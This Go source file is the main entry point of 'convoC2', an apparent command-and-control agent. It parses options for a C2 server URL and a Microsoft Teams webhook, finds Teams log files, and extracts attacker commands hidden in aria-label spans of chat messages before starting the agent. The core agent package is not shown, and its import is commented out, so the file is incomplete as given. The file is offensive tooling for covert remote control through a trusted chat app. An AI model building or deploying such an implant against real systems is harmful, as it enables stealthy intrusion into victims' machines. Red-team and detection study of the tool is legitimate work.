package main

import (
	"flag"
	"fmt"
	"os"
	"regexp"
	// import the agent package
)

var (
	verbose      bool
	serverURL    string
	timeout      int
	webhookURL   string
	commandRegex string
	findLogfiles bool // Variable to hold the value of the -f flag
	usingMac     bool // Variable to hold the value of the -m flag
)

func init() {
	flag.BoolVar(&verbose, "v", false, "")
	flag.StringVar(&serverURL, "s", "", "") // Insert in third parameter if you want to hardcode serverURL
	flag.IntVar(&timeout, "t", 1, "")
	flag.StringVar(&webhookURL, "w", "", "")                                              // Insert in third parameter if you want to hardcode webhookURL
	flag.StringVar(&commandRegex, "r", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "") // For now use the default because server only supports aria-label injection
	flag.BoolVar(&findLogfiles, "f", false, "Returns the log files path")
	flag.BoolVar(&usingMac, "m", false, "Sets that mac is being used, this decreases available functionality.")

	flag.BoolVar(&verbose, "verbose", false, "")
	flag.StringVar(&serverURL, "server", "", "") // Insert in third parameter if you want to hardcode serverURL
	flag.IntVar(&timeout, "timeout", 1, "")
	flag.StringVar(&webhookURL, "webhook", "", "")                                                                // Insert in third parameter if you want to hardcode webhookURL
	flag.StringVar(&commandRegex, "regex", `<span[^>]*aria-label="([^"]*)"[^>]*></span>`, "")                     // For now use the default because server only supports aria-label injection
	flag.BoolVar(&findLogfiles, "find-logfiles", false, "Returns the log files path")                             // Support for --find-logfiles
	flag.BoolVar(&usingMac, "mac", false, "Sets that mac is being used, this decreases available functionality.") // Support for --mac
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of convoC2 agent:\n")
		fmt.Fprintf(os.Stderr, "  -v, --verbose   Verbose logging (default false)\n")
		fmt.Fprintf(os.Stderr, "  -s, --server    C2 server URL (i.e. http://10.11.12.13/)\n")
		fmt.Fprintf(os.Stderr, "  -t, --timeout   Teams log file polling timeout [s] (default 1)\n")
		fmt.Fprintf(os.Stderr, "  -w, --webhook   Teams Webhook POST URL\n")
		fmt.Fprintf(os.Stderr, `  -r, --regex     Regex to match command (default "<span[^>]*aria-label=\"([^\"]*)\"[^>]*></span>")\n`)
		fmt.Fprintf(os.Stderr, "  -f, --find-logfiles     Returns the log files path \n")
		fmt.Fprintf(os.Stderr, "  -m, --mac       Sets that Mac is being used. This decreases available functionality. \n")
	}

	flag.Parse()

	// if -f, --find-logfiles is set, find the log directory and files
	if findLogfiles {
		// defaulting log dir to empty and error to not found
		logDir := ""
		var err error
		if usingMac {
			logDir, err = agent.MacFindLogDir()
		} else {
			logDir, err = agent.FindLogDir()
		}
		if err != nil {
			fmt.Fprintln(os.Stderr, "Error finding log directory:", err)
			os.Exit(1)
		}
		fmt.Println("Log directory:", logDir)
		logFiles, err := agent.FindLogFiles(logDir)
		if err != nil {
			fmt.Fprintln(os.Stderr, "Error finding log directory and files path:", err)
			os.Exit(1)
		}
		fmt.Println("Log files:")
		for _, file := range logFiles {
			fmt.Println(" -", file)
		}
		os.Exit(0) // Exit after printing log files
	}

	err := agent.Start(verbose, serverURL, timeout, webhookURL, regexp.MustCompile(commandRegex))
	if err != nil {
		fmt.Fprintln(os.Stderr, "Agent failed to run:", err)
		os.Exit(1)
	}
}
